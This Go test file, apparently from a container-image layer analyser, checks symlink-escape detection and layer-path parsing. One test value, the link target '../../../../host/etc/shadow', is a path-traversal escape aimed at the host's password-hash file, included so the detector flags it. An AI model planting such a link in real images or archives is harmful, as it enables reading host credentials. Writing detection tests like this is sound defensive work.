	if escapes["/etc/alternatives/vi"] || escapes["libz.so.1"] {
		t.Errorf("ordinary root-filesystem links are flagged as escaping: %v", escapes)
	}
	if !escapes["../../../../host/etc/shadow"] {
		t.Errorf("a link climbing above the layer root is not flagged: %v", escapes)
	}
	if built.tree.StrongAnomalies != 1 {
		t.Errorf("strong anomalies = %d (%v), want exactly the escaping link", built.tree.StrongAnomalies, built.tree.Anomalies)
	}
}

func TestLayerRelative(t *testing.T) {
	for p, want := range map[string][2]string{
		"layers/002-abcdef012345/usr/bin/x": {"layers/002-abcdef012345", "usr/bin/x"},
		"layers/001-abc/x":                  {"layers/001-abc", "x"},
	} {
		dir, rel, ok := layerRelative(p)
		if !ok || dir != want[0] || rel != want[1] {
			t.Errorf("layerRelative(%q) = %q, %q, %v", p, dir, rel, ok)
		}
	}
	for _, p := range []string{"image/run.txt", "layers/", "layers/001-abc", "layers//x", "x/layers/001/y"} {
		if _, _, ok := layerRelative(p); ok {
			t.Errorf("layerRelative(%q) accepted a path outside a layer directory", p)
		}
	}
}

// pseudoRandom returns n bytes that do not compress (xorshift), as a string.
func pseudoRandom(n int) string {
	out := make([]byte, n)
	x := uint64(0x9E3779B97F4A7C15)
	for i := range out {
		x ^= x << 13
		x ^= x >> 7
		x ^= x << 17
		out[i] = byte(x)
	}
	return string(out)
}
